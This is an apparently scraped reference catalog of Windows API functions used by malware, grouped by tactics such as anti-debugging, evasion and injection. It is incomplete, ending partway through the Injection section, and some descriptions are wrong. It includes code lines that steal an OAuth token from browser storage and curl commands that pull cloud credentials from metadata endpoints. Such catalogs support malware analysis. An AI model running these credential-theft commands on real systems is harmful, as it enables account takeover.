# Windows API Abuse
> Source: MalAPI, LOLAPI | Entries: 420 | Platform: windows


## Index

- [Anti-Debugging](#anti-debugging)
- [browser-extension](#browser-extension)
- [cloud-metadata](#cloud-metadata)
- [Enumeration](#enumeration)
- [Evasion](#evasion)
- [Helper](#helper)
- [Injection](#injection)
- [Internet](#internet)
- [Ransomware](#ransomware)
- [script-engine](#script-engine)
- [script-engine-api](#script-engine-api)
- [Spying](#spying)
- [windows-api](#windows-api)
- [windows-com](#windows-com)
- [windows-com-api](#windows-com-api)
- [windows-dotnet-api](#windows-dotnet-api)
- [windows-native-api](#windows-native-api)


### Anti-Debugging

#### CheckRemoteDebuggerPresent
CheckRemoteDebuggerPresent is used to check if a debugger is being used. This function is commonly used by malware fo...
**Categories:** Anti-Debugging, windows_api

#### CountClipboardFormats
CountClipboardFormats is used to determine whether victim's clipboard was empty. A kind of Anti-debugging technique t...
**Categories:** Anti-Debugging, windows_api

#### ExitWindowsEx
ExitWindowsEx is used to log off an interactive user, shuts down the system, or shuts down and restarts the system. T...
**Categories:** Anti-Debugging, windows_api

#### FindWindowA
FindWindowA is used to get a handle to the top-level window whose class name and window name match the specified stri...
**Categories:** Anti-Debugging, windows_api

#### FindWindowExA
FindWindowExA is used to get a handle to the top-level window whose class name and window name match the specified st...
**Categories:** Anti-Debugging, windows_api

#### GetTickCount
GetTickCount is used to retrieve the number of milliseconds since bootup. This function is used by malware for anti-d...
**Categories:** Anti-Debugging, windows_api

#### GetTickCount64
GetTickCount64 is used to retrieve the number of milliseconds that have elapsed since the system was started. This fu...
**Categories:** Anti-Debugging, windows_api

#### IsDebuggerPresent
IsDebuggerPresent is used to determine whether the calling process is being debugged by a user-mode debugger.
**Categories:** Anti-Debugging, windows_api

#### OutputDebugStringA
OutputDebugStringA sends a string to the debugger for display. This function can be used as an anti-debugging technique.
**Categories:** Anti-Debugging, windows_api

#### QueryPerformanceCounter
QueryPerformanceCounter is used to retrieve the frequency of the performance counter. This function is commonly used...
**Categories:** Anti-Debugging, windows_api

#### QueryPerformanceFrequency
QueryPerformanceFrequency is used to retrieve the frequency of the performance counter. This function is commonly use...
**Categories:** Anti-Debugging, windows_api

### browser-extension

#### Chrome Extension - storage.sync API
API: chrome.storage; Class: storage.sync; Steal OAuth tokens from browser storage
**Categories:** browser-extension, data-exfiltration, windows_api
```
chrome.storage.sync.get(['oauth_token'], function(result) { exfiltrate(result.oauth_token); });
```

#### Chrome Extension - webRequest API
API: chrome.webRequest; Class: onBeforeSendHeaders; Intercept and modify HTTP requests for credential theft
**Categories:** browser-extension, network-interception, windows_api
```
chrome.webRequest.onBeforeSendHeaders.addListener(function(details) { /* inject headers */ }, {urls: ['<all_urls>']});
```

### cloud-metadata

#### AWS EC2 Metadata Service
API: AWS; Class: EC2 Metadata Service; Access 169.254.169.254 to steal temporary credentials
**Categories:** cloud-metadata, token-theft, windows_api
```
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

#### Azure AD - Managed Identity Tokens
API: Azure; Class: Managed Identity; Steal managed identity tokens for privilege escalation
**Categories:** cloud-metadata, token-theft, windows_api
```
curl http://169.254.169.254/metadata/identity/oauth2/token?resource=https://management.azure.com
```

#### GCP - Compute Metadata Service
API: GCP; Class: Compute Metadata; Access GCP service account keys from metadata endpoint
**Categories:** cloud-metadata, token-theft, windows_api
```
curl http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/identity
```

### Enumeration

#### CreateToolhelp32Snapshot
CreateToolhelp32Snapshot is used to enumerate processes, threads, and modules. This function is commonly used by malw...
**Categories:** Enumeration, Anti-Debugging, windows_api

#### EnumDesktopWindows
EnumDesktopWindows is used to enumerate all top-level windows associated with the specified desktop. This function is...
**Categories:** Enumeration, windows_api

#### EnumDeviceDrivers
EnumDeviceDrivers is used to enumerate drivers in the machine. This function is commonly used with kernel malware or...
**Categories:** Enumeration, windows_api

#### EnumProcesses
EnumProcesses is used to enumerate processes in the machine. Process enumeration is often a precursor to process inje...
**Categories:** Enumeration, windows_api

#### EnumProcessModules
EnumProcessModules is used to enumerate the loaded modules (executables and DLLs) for a given process. Malware enumer...
**Categories:** Enumeration, windows_api

#### EnumProcessModulesEx
EnumProcessModulesEx is used to enumerate the loaded modules (executables and DLLs) for a given process. Malware enum...
**Categories:** Enumeration, windows_api

#### EnumResourceTypesA
EnumResourceTypesA is used to enumerate resource types within a binary module. Starting with Windows Vista, this is t...
**Categories:** Enumeration, windows_api

#### EnumResourceTypesExA
EnumResourceTypesExA is used to enumerate resource types associated with a specified binary module. The search can in...
**Categories:** Enumeration, windows_api

#### EnumSystemLocalesA
EnumSystemLocalesA is used enumerate installed locale identifiers, all of the supported identifiers or alternate sort...
**Categories:** Enumeration, Injection, Evasion, Ransomware, windows_api

#### EnumWindows
EnumWindows is used to enumerate all top-level windows on the screen by passing the handle to each window, in turn, t...
**Categories:** Enumeration, windows_api

#### FindFirstFileA
FindFirstFileA is used to search through a directory and enumerate the filesystem.
**Categories:** Enumeration, windows_api

#### FindFirstUrlCacheEntryA
FindFirstUrlCacheEntryA is used to begin the enumeration of the Internet cache.
**Categories:** Enumeration, Internet, windows_api

#### FindNextFileA
FindNextFileA is used to search through a directory and enumerate the filesystem.
**Categories:** Enumeration, windows_api

#### FindNextUrlCacheEntryA
FindNextUrlCacheEntryA is used to retrieve the next entry in the Internet cache.
**Categories:** Enumeration, Internet, windows_api

#### GetAdaptersInfo
GetAdaptersInfo is used to obtain information about the network adapters on the system. This function is commonly use...
**Categories:** Enumeration, windows_api

#### GetComputerNameA
GetComputerNameA is used to retrieve the computer name. This is commonly used by malware for anti-debugging purposes.
**Categories:** Enumeration, Anti-Debugging, windows_api

#### GetCurrentHwProfileA
GetCurrentHwProfileA is used to retrieve information about the current hardware profile for the local computer. This...
**Categories:** Enumeration, windows_api

#### GetCurrentProcess
GetCurrentProcess is used to retrieve a handle for the current process.
**Categories:** Enumeration, windows_api

#### GetCurrentProcessId
GetCurrentProcessId is used to retrieve the process identifier of the calling process.
**Categories:** Enumeration, windows_api

#### GetCurrentThread
GetCurrentThread is used to retrieve a handle for the calling thread.
**Categories:** Enumeration, windows_api

#### GetCurrentThreadId
GetCurrentThreadId is used to retrieve the thread identifier of the calling thread.
**Categories:** Enumeration, windows_api

#### GetDriveTypeA
GetDriveTypeA is used to determine whether a disk drive is a removable / fixed / CD-ROM / RAM disk or network drive.
**Categories:** Enumeration, Ransomware, Helper, windows_api

#### GetFileAttributesA
GetFileAttributesA is used to retrieve file system attributes for a specified file or directory.
**Categories:** Enumeration, windows_api

#### GetFileTime
GetFileTime is used to retrieve the date and time that a file or directory was created, last accessed, and last modif...
**Categories:** Enumeration, windows_api

#### GetIpNetTable
The GetIpNetTable function retrieves the IPv4 to physical address mapping table. Could be used to identify hosts & mo...
**Categories:** Enumeration, Helper, windows_api

#### GetLogicalDrives
GetLogicalDrives is used to retrieve a bitmask representing the currently available disk drives. This function can be...
**Categories:** Enumeration, Ransomware, Helper, windows_api

#### GetLogicalProcessorInformation
GetLogicalProcessorInformation is used to retrieve information about logical processors and related hardware. The fun...
**Categories:** Enumeration, Anti-Debugging, windows_api

#### GetLogicalProcessorInformationEx
GetLogicalProcessorInformationEx is used to retrieve information about logical processors and related hardware. The f...
**Categories:** Enumeration, Anti-Debugging, windows_api

#### GetModuleBaseNameA
GetModuleBaseNameA is used to retrieve the base name of a specified module.
**Categories:** Enumeration, Helper, windows_api

#### GetNativeSystemInfo
GetNativeSystemInfo is used to retrieve information about the current system to an application running under WOW64. I...
**Categories:** Enumeration, Anti-Debugging, windows_api

#### GetProcessId
GetProcessId is used to retrieve the process identifier of the specified process.
**Categories:** Enumeration, windows_api

#### GetProcessIdOfThread
GetProcessIdOfThread is used to retrieve the process identifier of the process associated with the specified thread.
**Categories:** Enumeration, windows_api

#### GetSystemDefaultLangId
GetSystemDefaultLangId is used to retrieve the language identifier for the system. This function is used by malware t...
**Categories:** Enumeration, windows_api

#### GetSystemDirectoryA
GetSystemDirectoryA retrieve the path of the system directory.
**Categories:** Enumeration, windows_api

#### GetSystemTime
GetSystemTime is used to retrieve the current system date and time in Coordinated Universal Time (UTC) format. This f...
**Categories:** Enumeration, Anti-Debugging, windows_api

#### GetSystemTimeAsFileTime
Retrieves the current system date and time. The information is in Coordinated Universal Time (UTC) format. This funct...
**Categories:** Enumeration, Anti-Debugging, windows_api

#### GetThreadId
GetThreadId is used to retrieve the thread identifier of the specified thread.
**Categories:** Enumeration, windows_api

#### GetThreadInformation
GetThreadInformation is used to retrieve information about the specified thread.
**Categories:** Enumeration, windows_api

#### GetThreadLocale
GetThreadLocale is used to retrieve the locale identifier of the current thread. Can be used alongside other language...
**Categories:** Enumeration, windows_api

#### GetUserNameA
GetUserNameA is used to retrieve the username associated with the current thread. This function is used by malware fo...
**Categories:** Enumeration, Anti-Debugging, windows_api

#### GetVersionExA
GetVersionExA is a classic method used to retrieve the Windows version.
**Categories:** Enumeration, windows_api

#### GetWindowsDirectoryA
GetWindowsDirectoryA is used to retreive the path to the Windows directory. This function may be used by malware retr...
**Categories:** Enumeration, windows_api

#### IsWoW64Process
IsWow64Process is used by a 32-bit process to determine if it is running on a 64-bit operating system.
**Categories:** Enumeration, Helper, windows_api

#### LookupAccountNameA
LookupAccountNameA is used to accept the name of a system and an account as input. It retrieves a security identifier...
**Categories:** Enumeration, windows_api

#### LookupPrivilegeValueA
LookupPrivilegeValueA is used to retrieve the locally unique identifier (LUID) used on a specified system to locally...
**Categories:** Enumeration, windows_api

#### Module32First
Module32First is used as part of CreateToolHelp32Snapshot for enumeration purposes.
**Categories:** Enumeration, windows_api

#### Module32Next
Module32Next is used as part of CreateToolHelp32Snapshot for enumeration purposes.
**Categories:** Enumeration, windows_api

#### NetShareCheck
NetShareCheck is used to check whether or not a server is sharing a device.
**Categories:** Enumeration, windows_api

#### NetShareEnum
NetShareEnum is used to retrieve information about each shared resource on a server.
**Categories:** Enumeration, windows_api

#### NetShareGetInfo
NetShareGetInfo is used to retrieves information about a particular shared resource on a server.
**Categories:** Enumeration, windows_api

#### NtQueryDirectoryFile
NtQueryDirectoryFile is used to retrieve information about a directory. This function can be used for enumeration pur...
**Categories:** Enumeration, windows_api

#### NtQueryInformationProcess
NtQueryInformationProcess is used to retrieve information about a specified process.
**Categories:** Enumeration, Anti-Debugging, windows_api

#### NtQuerySystemEnvironmentValueEx
NtQuerySystemEnvironmentValueEx is used to locate a specified system environment variable and return its value.
**Categories:** Enumeration, windows_api

#### PathFileExistsA
PathFileExistsA is used to determine whether a path to a file system object such as a file or folder is valid. This f...
**Categories:** Enumeration, windows_api

#### Process32First
Process32First is used as part of CreateToolhelp32Snapshot for enumeration purposes.
**Categories:** Enumeration, Injection, windows_api

#### Process32Next
Process32Next is used as part of CreateToolhelp32Snapshot for enumeration purposes.
**Categories:** Enumeration, Injection, windows_api

#### ReadFile
ReadFile - Windows API function associated with enumeration techniques
**Categories:** Enumeration, windows_api

#### ReadProcessMemory
ReadProcessMemory can be used to read the memory of a remote process.
**Categories:** Enumeration, Injection, windows_api

#### RegEnumKeyA
RegEnumKeyA is used to enumerate the subkeys of the specified open registry key. The function retrieves the name of o...
**Categories:** Enumeration, Helper, windows_api

#### RegEnumKeyExA
RegEnumKeyExA is used to enumerate the subkeys of the specified open registry key.
**Categories:** Enumeration, Helper, windows_api

#### RegEnumValueA
RegEnumValueA is used to enumerate the values for the specified open registry key
**Categories:** Enumeration, Helper, windows_api

#### RegQueryInfoKeyA
RegQueryInfoKeyA is used to retrieves information about the specified registry key.
**Categories:** Enumeration, windows_api

#### RegQueryMultipleValuesA
RegQueryMultipleValuesA is used to retrieve the type and data for a list of value names associated with an open regis...
**Categories:** Enumeration, windows_api

#### RegQueryValueExA
RegQueryValueExA is used to retrieve the type and data for the specified value name associated with an open registry...
**Categories:** Enumeration, windows_api

#### RtlGetVersion
RtlGetVersion is used to enumerate OS basic information properties such Windows and build versions.
**Categories:** Enumeration, Anti-Debugging, windows_api

#### SearchPathA
SearchPathA is used to search for a specified file in a specified path.
**Categories:** Enumeration, windows_api

#### Thread32First
Thread32First is used as part of CreateToolhelp32Snapshot for enumeration purposes.
**Categories:** Enumeration, Injection, windows_api

#### Thread32Next
Thread32Next is used as part of CreateToolhelp32Snapshot for enumeration purposes.
**Categories:** Enumeration, Injection, windows_api

#### VirtualQueryEx
VirtualQueryEx is used to retrieve information about a range of pages within the virtual address space of a specified...
**Categories:** Enumeration, windows_api

#### WNetAddConnection2A
The WNetAddConnection2A function makes a connection to a network resource and can redirect a local device to the netw...
**Categories:** Enumeration, Helper, windows_api

#### WNetAddConnectionA
The WNetAddConnectionA function enables the calling application to connect a local device to a network resource. A su...
**Categories:** Enumeration, windows_api

#### WNetCloseEnum
The WNetCloseEnum function ends a network resource enumeration started by a call to the WNetOpenEnum function.
**Categories:** Enumeration, windows_api

#### WNetEnumResourceA
The WNetEnumResourceA function continues an enumeration of network resources that was started by a call to the WNetOp...
**Categories:** Enumeration, Helper, windows_api

### Evasion

#### CreateTimerQueueTimer
CreateTimerQueueTimer is used to create a timer-queue timer. This function is commonly used by malware for time-based...
**Categories:** Evasion, windows_api

#### CreateWaitableTimer
CreateWaitableTimer is used to create a delay timer. This function is used by malware for time-based evasion.
**Categories:** Evasion, windows_api

#### CreateWindowExA
CreateWindowExA is used to create an overlapped, pop-up, or child window with an extended window style. This function...
**Categories:** Evasion, windows_api

#### CryptProtectData
CryptProtectData can be leveraged to create a malicious artifact for encrypting the file system (Ransomware), effecti...
**Categories:** Evasion, Ransomware, windows_api

#### DeleteFileA
DeleteFileA is used to delete an existing file. This function is used by malware to hide its tracks or tamper with an...
**Categories:** Evasion, windows_api

#### IcmpSendEcho
IcmpSendEcho is used to send an IPv4 ICMP echo request and returns any echo response replies. The call returns when t...
**Categories:** Evasion, windows_api

#### ImpersonateLoggedOnUser
The ImpersonateLoggedOnUser function lets the calling thread impersonate the security context of a logged-on user. Th...
**Categories:** Evasion, Helper, windows_api

#### LoadResource
LoadResource is used to load a resource from a PE file into memory. Malware sometimes uses resources to store strings...
**Categories:** Evasion, windows_api

#### LockResource
LockResource is used with FindResource(), LoadResource() and SizeOfResource() usually to work with embedded executabl...
**Categories:** Evasion, Helper, windows_api

#### NtDelayExecution
NtDelayExecution is used to suspend execution, similiar to the Sleep() API function. This function can be used by mal...
**Categories:** Evasion, windows_api

#### RegisterHotKey
RegisterHotKey is used to create a system wide hotkey. This function is commonly used by spyware or keyloggers to rec...
**Categories:** Evasion, Spying, windows_api

#### Select
Select is used to determine the status of one or more sockets, waiting if necessary, to perform synchronous I/O. This...
**Categories:** Evasion, windows_api

#### SetEnvironmentVariableA
SetEnvironmentVariableA sets the contents of the specified environment variable for the current process.  Setting cus...
**Categories:** Evasion, windows_api

#### SetFileAttributesA
SetFileAttributesA is used to set attributes of a file or directory. This function is commonly used by malware to mak...
**Categories:** Evasion, windows_api

#### SetFileTime
SetFileTime sets the date and time that the specified file or directory was created, last accessed, or last modified....
**Categories:** Evasion, windows_api

#### SetThreadToken
The SetThreadToken function assigns an impersonation token to a thread. The function can also cause a thread to stop...
**Categories:** Evasion, Helper, windows_api

#### SetTimer
SetTimer is used to create a timer with the specified time-out value. This function is commonly used by malware for t...
**Categories:** Evasion, windows_api

#### SetWaitableTimer
SetWaitableTimer is used to activate the specified waitable timer. This function is commonly used by malware for time...
**Categories:** Evasion, Evasion, windows_api

#### SizeOfResource
SizeOfResource checks and retrieves the size of given resource. Usually found in droppers
**Categories:** Evasion, Helper, windows_api

#### Sleep
Sleep is used to suspend the execution of the current thread for a set time. This function is commonly used for time-...
**Categories:** Evasion, Anti-Debugging, windows_api

#### SleepEx
SleepEx is used to suspend the execution of the current thread for a set time. This function is commonly used for tim...
**Categories:** Evasion, Anti-Debugging, windows_api

#### TimeGetTime
TimeGetTime is used to retrieve the system time, in milliseconds. The system time is the time elapsed since Windows w...
**Categories:** Evasion, windows_api

#### timeSetEvent
timeSetEvent is used to start a specified timer event. This function is obselete but is still used by malware for tim...
**Categories:** Evasion, windows_api

### Helper

#### BringWindowToTop
BringWindowToTop is used for bringing the specified window to the top of the Z order.
**Categories:** Helper, windows_api

#### CallWindowProcA
CallWindowProcA is used to pass message information to the specified window procedure.
**Categories:** Helper, windows_api

#### ConnectNamedPipe
ConnectNamedPipe is used to create a server pipe for interprocess communication that will wait for a client pipe to c...
**Categories:** Helper, windows_api

#### ControlService
ControlService is used to start, stop, modify, or send a signal to a running service. This function is commonly used...
**Categories:** Helper, windows_api

#### ControlServiceExA
ControlServiceExA is used to start, stop, modify, or send a signal to a running service. This function is commonly us...
**Categories:** Helper, windows_api

#### CopyFile2
CopyFile2 is used to copy an existing file to a new file.
**Categories:** Helper, windows_api

#### CopyFileA
CopyFileA is used to copy an existing file to a new file.
**Categories:** Helper, windows_api

#### CopyFileExA
CopyFileExA is used to copy an existing file to a new file.
**Categories:** Helper, windows_api

#### CreateFile2
CreateFile2 is used to create a new file or opens an existing file.
**Categories:** Helper, windows_api

#### CreateFileA
CreateFileA is used to create a new file or opens an existing file.
**Categories:** Helper, windows_api

#### CreateMutexA
CreateMutexA is used to create a new mutex object. Mutexs are often used by malware to prevent the reinfection of a s...
**Categories:** Helper, windows_api

#### CreateMutexExA
CreateMutexExA is used to create a new mutex object. Mutexs are often used by malware to prevent the reinfection of a...
**Categories:** Helper, windows_api

#### CreatePipe
CreatePipe is used to create an anonymous pipe and returns handles to the read and write ends of the pipe. Could be u...
**Categories:** Helper, windows_api

#### CreateServiceA
CreateServiceA is used to create a service object and adds it to the specified service control manager database. This...
**Categories:** Helper, windows_api

#### DeleteService
DeleteService is used to mark the specified service for deletion from the service control manager database.
**Categories:** Helper, windows_api

#### DeviceIoControl
DeviceIoControl is used to send a control message from user space to a device driver. DeviceIoControl is popular with...
**Categories:** Helper, windows_api

#### DrawTextExA
DrawTextExA is used to draw formatted text in the specified rectangle. This function has been used by ransomware for...
**Categories:** Helper, windows_api

#### FindClose
FindClose is used to close a file search handle.
**Categories:** Helper, windows_api

#### FindResourceA
FindResourceA is used to find a resource in an executable or loaded DLL. Malware sometimes uses resources to store st...
**Categories:** Helper, windows_api

#### FindResourceExA
FindResourceExA is used to find a resource in an executable or loaded DLL. Malware sometimes uses resources to store...
**Categories:** Helper, windows_api

#### GetDesktopWindow
GetDesktopWindow is used to get a handle to the desktop window that covers the entire screen.
**Categories:** Helper, windows_api

#### GetModuleFileNameA
GetModuleFileNameA is used to return the filename of a module that is loaded in the current process. Malware can use...
**Categories:** Helper, windows_api

#### GetModuleFileNameExA
GetModuleFileNameExA is used to return the filename of a module that is loaded in the current process. Malware can us...
**Categories:** Helper, windows_api

#### GetTempFileNameA
GetTempFileNameA is used to create a name for a temporary file. If a unique file name is generated, an empty file is...
**Categories:** Helper, windows_api

#### GetTempPathA
GetTempPathA is used to retrieve the path of the directory designated for temporary files. This is often used by malw...
**Categories:** Helper, windows_api

#### lstrcatA
lstrcatA is used to append one string to another.
**Categories:** Helper, windows_api

#### MoveFileA
MoveFileA is used to move an existing file or a directory, including its children.
**Categories:** Helper, windows_api

#### MoveFileExA
MoveFileExA is used to move an existing file or a directory, including its children.
**Categories:** Helper, windows_api

#### NetShareAdd
NetShareAdd is used to share a server resource.
**Categories:** Helper, windows_api

#### NetShareSetInfo
NetShareSetInfo is used to set the parameters of a shared resource.
**Categories:** Helper, windows_api

#### NtClose
NtClose is used to close an open handle.
**Categories:** Helper, windows_api

#### NtCreateFile
NtCreateFile is used to create a new file or directory, or opens an existing file, device, directory, or volume.
**Categories:** Helper, windows_api

#### NtDeleteKey
NtDeleteKey is used to delete a registry key.
**Categories:** Helper, windows_api

#### NtDeleteValueKey
NtDeleteValueKey is used to delete a registry key value.
**Categories:** Helper, windows_api

#### NtMakeTemporaryObject
NtMakeTemporaryObject is used to change the attributes of an object to make it temporary.
**Categories:** Helper, windows_api

#### NtQueryTimer
NtQueryTimer is used to query a timer's attributes.
**Categories:** Helper, windows_api

#### NtSetContextThread
NtSetContextThread is used to set the usermode context of the specified thread.
**Categories:** Helper, windows_api

#### NtSetInformationProcess
NtSetInformationProcess is used to modify information about a process such making it a critical process.
**Categories:** Helper, windows_api

#### NtSetInformationThread
NtSetInformationThread is used to set the priority of a thread.
**Categories:** Helper, windows_api

#### NtSetSystemEnvironmentValueEx
NtSetSystemEnvironmentValueEx is used to set a system environment variable.
**Categories:** Helper, windows_api

#### NtSetValueKey
NtSetValueKey is used to create or replace a registry value.
**Categories:** Helper, windows_api

#### NtShutdownSystem
NtShutdownSystem is used to shutdown the system.
**Categories:** Helper, windows_api

#### NtTerminateProcess
NtTerminateProcess is used to terminate a process and all its threads.
**Categories:** Helper, windows_api

#### NtTerminateThread
NtTerminateThread is used to terminate a thread.
**Categories:** Helper, windows_api

#### OpenClipboard
OpenClipboard is used to get a handle on the clipboard.
**Categories:** Helper, windows_api

#### OpenSCManagerA
OpenSCManagerA is used to open a handle to the service control manager. This function is commonly used when a malware...
**Categories:** Helper, windows_api

#### OpenServiceA
OpenServiceA is used to open an existing service.
**Categories:** Helper, windows_api

#### PeekNamedPipe
Used to copy data from a named pipe without removing data from the 
pipe. This function has been used by exploits tar...
**Categories:** Helper, windows_api

#### RegCloseKey
RegCloseKey is used to close a handle to the specified registry key.
**Categories:** Helper, windows_api

#### RegConnectRegistryA
RegConnectRegistryA is used to establish a connection to a predefined registry key on another computer.
**Categories:** Helper, windows_api

#### RegCopyTreeA
RegCopyTreeA is used to copy the specified registry key, along with its values and subkeys, to the specified destinat...
**Categories:** Helper, windows_api

#### RegCreateKeyA
RegCreateKeyA is used to create a specified registry key. If the key already exists, the function opens it.
**Categories:** Helper, windows_api

#### RegCreateKeyExA
RegCreateKeyExA is used to create a specified registry key. If the key already exists, the function opens it.
**Categories:** Helper, windows_api

#### RegCreateKeyTransactedA
RegCreateKeyTransactedA is used to create the specified registry key and associates it with a transaction. If the key...
**Categories:** Helper, windows_api

#### RegDeleteKeyA
RegDeleteKeyA is used to delete a subkey and its values from the specified platform-specific view of the registry.
**Categories:** Helper, windows_api

#### RegDeleteKeyExA
RegDeleteKeyExA is used to delete a subkey and its values from the specified platform-specific view of the registry.
**Categories:** Helper, windows_api

#### RegDeleteKeyTransactedA
RegDeleteKeyTransactedA is used to delete a subkey and its values from the specified platform-specific view of the re...
**Categories:** Helper, windows_api

#### RegDeleteKeyValueA
RegDeleteKeyValueA is used to remove the specified value from the specified registry key and subkey.
**Categories:** Helper, windows_api

#### RegDeleteTreeA
RegDeleteTreeA is used to delete the subkeys and values of the specified key recursively.
**Categories:** Helper, windows_api

#### RegDeleteValueA
RegDeleteValueA is used to remove a named value from the specified registry key.
**Categories:** Helper, Helper, windows_api

#### RegFlushKey
RegFlushKey is used to write all the attributes of the specified open registry key into the registry.
**Categories:** Helper, windows_api

#### RegGetKeySecurity
RegGetKeySecurity is used to retrieve a copy of the security descriptor protecting the specified open registry key.
**Categories:** Helper, windows_api

#### RegGetValueA
RegGetValueA is used to retrieve the type and data for the specified registry value.
**Categories:** Helper, windows_api

#### RegLoadKeyA
RegLoadKeyA is used to create a subkey under HKEY_USERS or HKEY_LOCAL_MACHINE and loads the data from the specified r...
**Categories:** Helper, windows_api

#### RegLoadMUIStringA
RegLoadMUIStringA is used to load the specified string from the specified key and subkey.
**Categories:** Helper, windows_api

#### RegOpenCurrentUser
RegOpenCurrentUser is used to retrieve a handle to the HKEY_CURRENT_USER key for the user the current thread is imper...
**Categories:** Helper, windows_api

#### RegOpenKeyA
RegOpenKeyA is used to open a specified registry key.
**Categories:** Helper, windows_api

#### RegOpenKeyExA
RegOpenKeyExA is used to open a specified registry key.
**Categories:** Helper, Helper, windows_api

#### RegOpenKeyTransactedA
RegOpenKeyTransactedA is used to open the specified registry key and associates it with a transaction
**Categories:** Helper, windows_api

#### RegOpenUserClassesRoot
RegOpenUserClassesRoot is used to retrieve a handle to the HKEY_CLASSES_ROOT key for a specified user.
**Categories:** Helper, windows_api

#### RegOverridePredefKey
RegOverridePredefKey is used to map a predefined registry key to the specified registry key.
**Categories:** Helper, windows_api

#### RegReplaceKeyA
RegReplaceKeyA is used to replace the file backing a registry key and all its subkeys with another file, so that when...
**Categories:** Helper, windows_api

#### RegRestoreKeyA
RegRestoreKeyA is used to read the registry information in a specified file and copies it over the specified key.
**Categories:** Helper, windows_api

#### RegSaveKeyA
RegSaveKeyA is used to save the specified key and all of its subkeys and values to a registry file, in the specified...
**Categories:** Helper, windows_api

#### RegSaveKeyExA
RegSaveKeyExA is used to save the specified key and all of its subkeys and values to a registry file, in the specifie...
**Categories:** Helper, windows_api

#### RegSetKeySecurity
RegSetKeySecurity is used to set the security of an open registry key.
**Categories:** Helper, windows_api

#### RegSetKeyValueA
RegSetKeyValueA is used to set a value for a given registry key.
**Categories:** Helper, windows_api

#### RegSetValueExA
RegSetValueExA is used to set a value and type for a given registry key.
**Categories:** Helper, windows_api

#### RegUnLoadKeyA
RegUnLoadKeyA is used to unload the specified registry key and its subkeys from the registry.
**Categories:** Helper, windows_api

#### RtlSetProcessIsCritical
RtlSetProcessIsCritical is used to set a process to a system critical status. This function is used by malware to pre...
**Categories:** Helper, windows_api

#### SetClipboardData
SetClipboardData is used to place data on the clipboard in a specified clipboard format.
**Categories:** Helper, windows_api

#### SetCurrentDirectory
SetCurrentDirectory is used to change the current directory for the current process.
**Categories:** Helper, windows_api

#### SetFocus
SetFocus is used to set the keyboard focus to the specified window
**Categories:** Helper, windows_api

#### SetForegroundWindow
SetForegroundWindow is used for bring the thread that created the specified window into the foreground and activates...
**Categories:** Helper, windows_api

#### SetThreadPriority
SetThreadPriority is used to set the priority value for the specified thread. This value, together with the priority...
**Categories:** Helper, windows_api

#### SetWindowLongA
SetWindowLongA is used to changes an attribute of a specified window.
**Categories:** Helper, windows_api

#### SetWindowLongPtrA
SetWindowLongPtrA is used to changes an attribute of a specified window.
**Categories:** Helper, windows_api

#### ShowWindow
ShowWindow is used to set the specified window's show state.
**Categories:** Helper, windows_api

#### StartServiceA
StartServiceA is used to start a service.
**Categories:** Helper, windows_api

#### StartServiceCtrlDispatcherA
StartServiceCtrlDispatcherA is used by a service to connect the main thread of the process to the service control man...
**Categories:** Helper, windows_api

#### TerminateProcess
TerminateProcess is used to terminate a process.
**Categories:** Helper, windows_api

#### TerminateThread
TerminateThread is used to terminate a thread.
**Categories:** Helper, windows_api

#### UnmapViewOfFile
UnmapViewOfFile is used to unmap a mapped view of a file from the calling process's address space.
**Categories:** Helper, windows_api

#### WriteFile
WriteFile is used to write data to the specified file or input/output (I/O) device.
**Categories:** Helper, windows_api

### Injection

#### AdjustTokenPrivileges
AdjustTokenPrivileges is used to enable or disable specific access privileges. Malware that performs process injectio...
**Categories:** Injection, windows_api

#### CreateFileMappingA
CreateFileMappingA creates a handle to a file mapping that loads a file into memory and makes it accessible via memor...
**Categories:** Injection, Evasion, windows_api

#### CreateProcessA
CreateProcessA is used to create a process. This function is used by malware in several process injection attacks suc...
**Categories:** Injection, windows_api

#### CreateProcessAsUserA
CreateProcessAsUserA is used to create a new process and its primary thread.
**Categories:** Injection, windows_api

#### CreateProcessInternal
CreateProcessInternal is an undocumented API for process creation. According to Windows Internals, CreateProcess and...
**Categories:** Injection, Evasion, windows_api

#### CreateProcessWithTokenW
CreateProcessWithTokenW is used to create a new process and its primary thread.
**Categories:** Injection, windows_api

#### CreateRemoteThread
CreateRemoteThread is used to create a thread that runs in the virtual address space of another process.
**Categories:** Injection, windows_api

#### CreateRemoteThreadEx
CreateRemoteThreadEx is used to create a thread that runs in the virtual address space of another process.
**Categories:** Injection, windows_api

#### CreateThread
CreateThread is used to create a thread to execute within the virtual address space of the calling process. This func...
**Categories:** Injection, windows_api

#### DebugActiveProcessStop
DebugActiveProcessStop stops the debugger from debugging the specified process.
**Categories:** Injection, windows_api

#### DuplicateToken
The DuplicateToken function creates a new access token that duplicates one already in existence.
**Categories:** Injection, Evasion, windows_api

#### GetModuleHandleA
GetModuleHandleW is used to retrieve a module handle for the specified module. The module must have been loaded by th...
**Categories:** Injection, Evasion, windows_api

#### GetProcAddress
GetProcAddress is used to get the memory address of a function in a DLL. This is often used by malware for obfuscatio...
**Categories:** Injection, Evasion, windows_api

#### GetProcessHeap
GetProcessHeap is used to retrieve a handle to the default heap of the calling process.
**Categories:** Injection, windows_api

#### GetProcessHeaps
GetProcessHeaps is used to return the number of active heaps and retrieves handles to all of the active heaps for the...
**Categories:** Injection, windows_api

#### GetThreadContext
GetThreadContext is used to retrieve a thread's context. This is often used as part of process injection techniques.
**Categories:** Injection, windows_api

#### GlobalAlloc
GlobalAlloc is used to allocate the specified number of bytes from the heap.
**Categories:** Injection, windows_api

#### HeapAlloc
HeapAlloc is used to allocate a block of memory from a heap.
**Categories:** Injection, windows_api

#### HeapCreate
HeapCreate is used to allocate heap memory that can be used by the calling process.
**Categories:** Injection, windows_api

#### HeapReAlloc
HeapReAlloc is used to reallocate a block of memory from a heap.
**Categories:** Injection, windows_api

#### KeInsertQueueApc
KeInsertQueueApc is responsible for attaching an initialized APC to the APC queue of its target thread
**Categories:** Injection, windows_api

#### LdrLoadDll
LdrLoadDll is used instead of LoadLibrary to load modules.
**Categories:** Injection, windows_api

#### LoadLibraryA
LoadLibraryA is used to load a specified module into the address space of the calling process. Malware commonly use t...
**Categories:** Injection, Evasion, windows_api

#### LoadLibraryExA
LoadLibraryExA is used to load a specified module into the address space of the calling process. Malware commonly use...
**Categories:** Injection, Evasion, windows_api

#### LocalAlloc
LocalAlloc is used for heap allocation and manipulation.
**Categories:** Injection, windows_api

#### MapViewOfFile
MapViewOfFile is used for heap allocation and manipulation.
